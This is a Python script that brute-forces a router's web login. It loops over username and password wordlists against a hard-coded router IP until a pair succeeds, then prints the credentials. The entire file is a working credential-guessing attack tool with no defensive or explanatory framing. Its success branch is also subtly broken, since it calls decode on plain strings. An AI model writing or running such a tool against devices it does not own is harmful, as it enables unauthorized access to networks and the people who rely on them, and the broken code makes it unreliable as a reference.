import requests

def read_items_from_file(file_name):
    with open(file_name, 'r', encoding='utf-8') as file:
        items = [line.strip() for line in file]
    return items

def login(router_ip, username, password):
    url = f"http://{router_ip}/Login.htm"
    try:
        username = username.encode('utf-8')
        password = password.encode('utf-8')
        response = requests.get(url, auth=(username, password))
        if response.status_code == 200 and "Successful" in response.text:
            return True
    except requests.RequestException as e:
        pass
    return False

def main():
    router_ip = "192.168.13.252"
    usernames = read_items_from_file('usernames.txt')
    passwords = read_items_from_file('pass.txt')
    successful_login = None  
    for username in usernames:
        if successful_login: 
            break
        for password in passwords:
            if login(router_ip, username, password):
                successful_login = (username, password)
                break 

    if successful_login:
        print("Logging Successful")
        username, password = successful_login 
        print(f"username: {username.decode('utf-8')}\npassword: {password.decode('utf-8')}")
    else:
        print("Logging Failed")

if __name__ == "__main__":
    main()
